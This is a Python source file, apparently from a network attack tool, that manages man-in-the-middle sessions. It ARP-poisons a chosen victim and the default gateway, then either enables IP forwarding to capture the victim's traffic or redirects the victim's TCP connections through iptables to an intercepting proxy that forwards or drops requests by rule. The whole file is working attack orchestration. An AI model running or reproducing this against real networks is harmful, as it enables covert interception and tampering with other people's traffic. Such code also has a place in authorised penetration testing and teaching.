"""MITM lifecycle manager — Observe + Intercept modes."""
from __future__ import annotations
import ipaddress
import logging
import queue
import subprocess
import threading
import time
from typing import Optional

from .. import discovery, network as net_mod
from . import arp, capture, forwarding
from .flows import FlowTracker
from .models import MitmSession, MitmState
from .proxy import InterceptProxy
from .rules import ENGINE
from .stream import STREAM

log = logging.getLogger("mitm.manager")

PROXY_PORT = 8443


def _get_gateway_linux() -> Optional[str]:
    try:
        out = subprocess.check_output(["ip", "route"], text=True, timeout=2)
        for line in out.splitlines():
            if line.startswith("default"):
                parts = line.split()
                if "via" in parts:
                    return parts[parts.index("via") + 1]
    except Exception as e:
        log.warning("gateway detection failed: %s", e)
    return None


def _device_name_for(ip: str) -> Optional[str]:
    try:
        d = discovery.find_device(ip)
        if d and d.get("hostname"):
            return d["hostname"]
    except Exception:
        pass
    return None


class MitmManager:
    def __init__(self):
        self._lock = threading.RLock()
        self._session = MitmSession()
        self._mode = "observe"        # observe | intercept
        self._poisoner: Optional[arp.ArpPoisoner] = None
        self._capturer: Optional[capture.PacketCapturer] = None
        self._proxy: Optional[InterceptProxy] = None
        self._flows: Optional[FlowTracker] = None
        self._queue: "queue.Queue" = queue.Queue(maxsize=10000)
        self._pump_thread: Optional[threading.Thread] = None
        self._pump_stop = threading.Event()
        self._arp_thread: Optional[threading.Thread] = None
        self._arp_stop = threading.Event()
        self._flow_thread: Optional[threading.Thread] = None
        self._flow_stop = threading.Event()
        self._forwarding_enabled_by_us = False
        self._redirect_enabled_by_us = False

    # ------------------------------------------------------------------
    def get_status(self) -> dict:
        with self._lock:
            data = self._session.to_dict()
            data["mode"] = self._mode
        data["paused"] = STREAM.is_paused()
        data["packet_count"] = len(STREAM.recent(limit=10**9))
        return data

    def get_flows(self) -> list:
        if self._flows is None:
            return []
        try:
            return self._flows.snapshot()
        except Exception:
            return []

    def get_intercepts(self) -> list:
        if self._proxy is None:
            return []
        try:
            return self._proxy.snapshot()
        except Exception:
            return []

    def get_rules(self) -> dict:
        return ENGINE.list()

    # ------------------------------------------------------------------
    def start(self, victim_ip: str, iface: Optional[str] = None,
              mode: str = "observe") -> dict:
        mode = (mode or "observe").lower()
        if mode not in ("observe", "intercept"):
            return {"ok": False, "error": f"Invalid mode: {mode}"}

        with self._lock:
            if self._session.state in (MitmState.STARTING, MitmState.RUNNING,
                                        MitmState.STOPPING):
                return {"ok": False, "error": f"MITM is already {self._session.state.value}"}
            self._session = MitmSession(state=MitmState.STARTING)
            self._mode = mode

        try:
            primary = net_mod.get_primary()
            if not primary:
                raise RuntimeError("No active network interface found")

            chosen_iface = iface or primary["name"]
            attacker_ip = primary["ip"]
            attacker_mac = self._get_iface_mac(chosen_iface)
            if not attacker_mac:
                raise RuntimeError(f"Cannot determine MAC for interface {chosen_iface}")

            victim_mac = arp.get_mac(victim_ip, chosen_iface, timeout=2.0)
            if not victim_mac:
                raise RuntimeError(f"Victim {victim_ip} is not reachable via ARP")

            gateway_ip = _get_gateway_linux()
            if not gateway_ip:
                raise RuntimeError("Could not determine default gateway")

            gateway_mac = arp.get_mac(gateway_ip, chosen_iface, timeout=2.0)
            if not gateway_mac:
                raise RuntimeError(f"Gateway {gateway_ip} is not reachable via ARP")

            try:
                iface_net = ipaddress.ip_network(primary["cidr"], strict=False)
                for name, ip in (("victim", victim_ip), ("gateway", gateway_ip)):
                    if ipaddress.ip_address(ip) not in iface_net:
                        raise RuntimeError(f"{name.capitalize()} {ip} is not on {primary['cidr']}")
            except ValueError:
                pass

            victim_name = _device_name_for(victim_ip) or None
            gateway_name = _device_name_for(gateway_ip) or None

            with self._lock:
                self._session.victim_ip = victim_ip
                self._session.victim_name = victim_name
                self._session.victim_mac = victim_mac
                self._session.gateway_ip = gateway_ip
                self._session.gateway_name = gateway_name
                self._session.gateway_mac = gateway_mac
                self._session.attacker_iface = chosen_iface
                self._session.attacker_ip = attacker_ip
                self._session.attacker_mac = attacker_mac

            log.info("MITM start mode=%s victim=%s (%s) gateway=%s (%s) iface=%s",
                     mode, victim_ip, victim_mac, gateway_ip, gateway_mac, chosen_iface)

            # Start ARP poisoner first (needed for both modes)
            self._poisoner = arp.ArpPoisoner(
                victim_ip=victim_ip, victim_mac=victim_mac,
                gateway_ip=gateway_ip, gateway_mac=gateway_mac,
                attacker_mac=attacker_mac, iface=chosen_iface,
                interval=1.5,
            )
            self._poisoner.start()

            if mode == "observe":
                # Kernel forwarding + FORWARD ACCEPT rules
                if not forwarding.enable_forwarding(chosen_iface):
                    raise RuntimeError("Could not enable IP forwarding (need root)")
                self._forwarding_enabled_by_us = True
                with self._lock:
                    self._session.forwarded = True

                # Flow tracker
                self._flows = FlowTracker(victim_ip=victim_ip)

                # Capture
                STREAM.clear()
                self._capturer = capture.PacketCapturer(
                    iface=chosen_iface, out_queue=self._queue,
                    on_flow=self._observe_flow,
                )
                self._capturer.start()

                # Pump + emitters
                self._pump_stop.clear()
                self._pump_thread = threading.Thread(target=self._pump, daemon=True)
                self._pump_thread.start()
                self._arp_stop.clear()
                self._arp_thread = threading.Thread(target=self._emit_arp_stats, daemon=True)
                self._arp_thread.start()
                self._flow_stop.clear()
                self._flow_thread = threading.Thread(target=self._emit_flows, daemon=True)
                self._flow_thread.start()

            else:  # intercept
                # Redirect victim TCP to our proxy
                if not forwarding.enable_redirect(chosen_iface, victim_ip, PROXY_PORT):
                    raise RuntimeError("Could not set up iptables REDIRECT (need root)")
                self._redirect_enabled_by_us = True

                # Load rules
                ENGINE.load()

                # Start the proxy
                STREAM.clear()
                self._proxy = InterceptProxy(listen_port=PROXY_PORT, engine=ENGINE)
                self._proxy.start()

                # ARP stats emitter (still useful for the Control tab)
                self._arp_stop.clear()
                self._arp_thread = threading.Thread(target=self._emit_arp_stats, daemon=True)
                self._arp_thread.start()

            with self._lock:
                self._session.state = MitmState.RUNNING
                self._session.started_at = time.time()
                self._session.error = None
                return {"ok": True, "session": self._session.to_dict(), "mode": mode}

        except Exception as e:
            log.exception("MITM start failed")
            with self._lock:
                self._session.state = MitmState.ERROR
                self._session.error = str(e)
            self._cleanup(restore_arp=False)
            return {"ok": False, "error": str(e)}

    # ------------------------------------------------------------------
    def stop(self) -> dict:
        with self._lock:
            if self._session.state == MitmState.STOPPED:
                return {"ok": True, "message": "Already stopped"}
            if self._session.state == MitmState.STOPPING:
                return {"ok": True, "message": "Already stopping"}
            self._session.state = MitmState.STOPPING

        log.info("MITM stop requested")
        try:
            self._cleanup(restore_arp=True)
        except Exception as e:
            log.exception("Stop cleanup failed")
            with self._lock:
                self._session.error = str(e)

        with self._lock:
            self._session.state = MitmState.STOPPED
            self._session.stopped_at = time.time()
            data = self._session.to_dict()
            data["mode"] = self._mode
        log.info("MITM stopped")
        return {"ok": True, "session": data}

    def pause(self) -> dict:
        STREAM.pause()
        return {"ok": True, "paused": True}

    def resume(self) -> dict:
        STREAM.resume()
        return {"ok": True, "paused": False}

    def clear_packets(self) -> dict:
        STREAM.clear()
        return {"ok": True}

    def intercept_decide(self, intercept_id: int, action: str) -> dict:
        if not self._proxy:
            return {"ok": False, "error": "No intercept session running"}
        ok = self._proxy.decide(intercept_id, action)
        return {"ok": ok}

    def intercept_forward_all(self) -> dict:
        if not self._proxy:
            return {"ok": False, "error": "No intercept session running"}
        n = self._proxy.forward_all_pending()
        return {"ok": True, "count": n}

    def intercept_drop_all(self) -> dict:
        if not self._proxy:
            return {"ok": False, "error": "No intercept session running"}
        n = self._proxy.drop_all_pending()
        return {"ok": True, "count": n}

    def intercept_clear(self) -> dict:
        if not self._proxy:
            return {"ok": False, "error": "No intercept session running"}
        self._proxy.clear_history()
        return {"ok": True}

    def rules_add(self, action: str, pattern: str) -> dict:
        try:
            ENGINE.add(action, pattern)
            return {"ok": True, "rules": ENGINE.list()}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def rules_remove(self, index: int) -> dict:
        ENGINE.remove(index)
        return {"ok": True, "rules": ENGINE.list()}

    def rules_toggle(self, index: int) -> dict:
        ENGINE.toggle(index)
        return {"ok": True, "rules": ENGINE.list()}

    def rules_set_default(self, action: str) -> dict:
        try:
            ENGINE.set_default(action)
            return {"ok": True, "rules": ENGINE.list()}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    # ------------------------------------------------------------------
    def _observe_flow(self, pkt) -> None:
        if self._flows is None:
            return
        try:
            self._flows.observe(pkt)
        except Exception as e:
            log.debug("flow observe failed: %s", e)

    def _get_iface_mac(self, iface: str) -> Optional[str]:
        try:
            import fcntl
            import struct
            import socket as _s
            s = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
            info = fcntl.ioctl(s.fileno(), 0x8927,
                               struct.pack("256s", iface[:15].encode()))
            return ":".join(f"{b:02X}" for b in info[18:24])
        except Exception as e:
            log.warning("MAC lookup failed for %s: %s", iface, e)
        return None

    def _pump(self) -> None:
        while not self._pump_stop.is_set():
            try:
                rec = self._queue.get(timeout=0.5)
                STREAM.publish(rec)
            except queue.Empty:
                continue
            except Exception as e:
                log.debug("pump error: %s", e)

    def _emit_arp_stats(self) -> None:
        while not self._arp_stop.is_set():
            try:
                if self._poisoner is not None:
                    s = self._poisoner.stats()
                    payload = dict(s)
                    with self._lock:
                        payload["victim_ip"] = self._session.victim_ip
                        payload["victim_name"] = self._session.victim_name
                        payload["victim_mac"] = self._session.victim_mac
                        payload["gateway_ip"] = self._session.gateway_ip
                        payload["gateway_name"] = self._session.gateway_name
                        payload["gateway_mac"] = self._session.gateway_mac
                        payload["attacker_mac"] = self._session.attacker_mac
                    STREAM.publish_arp(payload)
            except Exception as e:
                log.debug("arp emit failed: %s", e)
            self._arp_stop.wait(1.0)

    def _emit_flows(self) -> None:
        while not self._flow_stop.is_set():
            try:
                if self._flows is not None:
                    for f in self._flows.snapshot():
                        STREAM.publish_flow(f)
            except Exception as e:
                log.debug("flow emit failed: %s", e)
            self._flow_stop.wait(1.0)

    def _cleanup(self, restore_arp: bool) -> None:
        # Proxy
        if self._proxy:
            try:
                self._proxy.stop()
            except Exception:
                pass
            self._proxy = None

        # Capture
        if self._capturer:
            try:
                self._capturer.stop()
            except Exception:
                pass
            self._capturer = None

        # Pump / emitters
        self._pump_stop.set()
        self._arp_stop.set()
        self._flow_stop.set()
        for t in (self._pump_thread, self._arp_thread, self._flow_thread):
            if t:
                try: t.join(timeout=2.0)
                except Exception: pass
        self._pump_thread = None
        self._arp_thread = None
        self._flow_thread = None

        # ARP
        if self._poisoner:
            try:
                self._poisoner.stop()
                self._poisoner.join(timeout=5.0)
            except Exception:
                pass
            self._poisoner = None

        # Forwarding / redirect
        iface = None
        victim_ip = None
        with self._lock:
            iface = self._session.attacker_iface
            victim_ip = self._session.victim_ip

        if self._redirect_enabled_by_us and iface and victim_ip:
            forwarding.disable_redirect(iface, victim_ip, PROXY_PORT)
            self._redirect_enabled_by_us = False

        if self._forwarding_enabled_by_us and iface:
            forwarding.disable_forwarding(iface)
            self._forwarding_enabled_by_us = False
            with self._lock:
                self._session.forwarded = False

        try:
            while True:
                self._queue.get_nowait()
        except queue.Empty:
            pass


_manager_lock = threading.Lock()
_manager: Optional[MitmManager] = None


def get_manager() -> MitmManager:
    global _manager
    with _manager_lock:
        if _manager is None:
            _manager = MitmManager()
        return _manager